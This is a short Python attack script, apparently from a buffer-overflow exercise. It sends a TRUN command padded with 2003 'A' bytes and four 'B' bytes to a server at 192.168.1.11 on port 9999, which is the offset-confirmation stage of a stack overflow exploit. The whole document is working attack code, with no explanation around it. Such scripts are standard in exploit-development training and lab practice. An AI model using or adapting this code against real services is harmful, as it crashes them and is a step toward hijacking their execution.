#!/usr/bin/python

import socket
import sys

offset = b"A" * 2003 + b"B" * 4
data = b"TRUN /.:/" + offset

ip = "192.168.1.11"
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send((data))
    s.close()

except socket.error:
    print("Error connecting to server")
    sys.exit()
